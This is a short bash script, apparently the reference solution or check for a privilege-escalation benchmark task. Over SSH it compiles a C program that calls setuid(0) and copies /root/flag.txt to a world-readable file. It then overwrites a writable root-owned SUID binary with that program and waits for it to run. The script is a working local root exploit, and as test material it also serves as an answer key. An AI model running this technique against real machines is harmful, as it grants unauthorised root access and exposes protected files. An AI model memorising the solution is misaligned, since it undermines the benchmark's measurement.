#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/suid_flag
cat >/tmp/pwn.c <<'\''C'\''
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
int main(void) {
  setuid(0); setgid(0);
  FILE *in = fopen("/root/flag.txt", "r");
  FILE *out = fopen("/tmp/suid_flag", "w");
  if (!in || !out) return 1;
  char buf[256];
  if (fgets(buf, sizeof buf, in)) fputs(buf, out);
  fclose(in); fclose(out);
  chmod("/tmp/suid_flag", 0644);
  return 0;
}
C
gcc -o /tmp/pwn /tmp/pwn.c
# Overwrite in place (preserve root ownership). Do not exec as lowpriv — that
# creates an empty /tmp/suid_flag when SUID is ignored and confuses the wait loop.
cat /tmp/pwn > /opt/bench/suidbin
sync
for i in $(seq 1 30); do
  if test -s /tmp/suid_flag && grep -q FLAG /tmp/suid_flag; then
    cat /tmp/suid_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for writable SUID / root executor" >&2
ls -la /opt/bench/suidbin /tmp/suid_flag >&2 || true
exit 1
')"
assert_root_output "${out}"
